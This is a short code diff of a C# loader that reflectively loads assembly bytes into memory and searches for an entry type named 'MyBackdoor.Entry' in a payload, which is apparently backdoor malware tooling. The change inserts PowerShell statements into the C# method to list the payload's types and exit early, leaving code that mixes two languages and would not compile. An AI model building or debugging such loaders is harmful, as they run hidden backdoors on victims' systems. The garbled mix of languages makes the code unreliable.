@@ -43,7 +43,12 @@ public static class ManagedLoader {
         try {
             // Load the managed assembly
             Assembly asm = Assembly.Load(assemblyBytes);
-            Console.WriteLine("[*] Assembly loaded successfully");
+            Write-Host "[*] Inspecting payload assembly types…"
+            $types = $asm.GetTypes()
+            foreach ($t in $types) {
+                Write-Host "    $($t.FullName)"
+            }
+            exit 0   # stop early so you can see the list
             
             // Find the Entry type and Start method from your C# payload
             Type entryType = asm.GetType("MyBackdoor.Entry");
